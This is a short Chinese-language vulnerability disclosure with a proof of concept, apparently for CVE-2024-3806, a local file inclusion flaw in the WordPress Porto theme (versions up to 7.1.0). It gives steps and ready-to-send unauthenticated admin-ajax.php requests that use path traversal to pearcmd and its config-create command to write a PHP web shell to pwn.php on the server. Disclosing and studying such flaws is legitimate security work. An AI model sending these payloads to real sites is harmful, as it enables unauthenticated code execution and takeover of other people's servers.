

影响描述

  WordPress的Porto主题在7.1.0之前（包括7.1.0）的所有版本中都容易通过“Porto_ajax_posts”功能被本地文件包含。这使得未经身份验证的攻击者有可能在服务器上包含并执行任意文件，从而允许执行这些文件中的任何PHP代码。这可以用来绕过访问控制，获取敏感数据，或者在php文件类型可以上传和包含的情况下实现代码执行。

差异函数porto_ajax_posts文件：inc\functions\post.php



poc&exp

重现步骤：

1. 创建具有slideshow_type值的帖子：`../../../../../../../../../usr/local/lib/php/pearcmd`
2. 发送请求

无需登录即可访问：`<Host>/wp-admin/admin-ajax.php?action=porto_ajax_posts&post_type=post&post_layout=full&+config-create+/&/<?=`$_GET[0]`?>+/var/www/html/pwn.php`

或

无需登录即可访问：`<Host>/wp-admin/admin-ajax.php?action=porto_ajax_posts&post_type=post&post_layout=full&+config-create+/&/<?=`$_GET[0]`?>+/var/www/html/pwn.php&nonce={{porto_nonce}}`





视频

<video src="cve-2024-3806.mp4"></video>